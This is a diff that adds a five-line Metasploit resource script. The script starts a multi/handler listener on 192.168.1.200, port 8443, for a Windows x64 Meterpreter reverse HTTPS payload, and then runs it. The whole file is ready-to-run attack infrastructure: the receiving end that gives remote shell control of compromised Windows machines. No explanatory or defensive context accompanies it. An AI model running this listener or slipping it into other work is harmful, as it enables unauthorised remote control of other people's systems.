@@ -1,0 +1,5 @@
+use exploit/multi/handler
+set lhost 192.168.1.200
+set lport 8443
+set payload windows/x64/meterpreter/reverse_https
+exploit
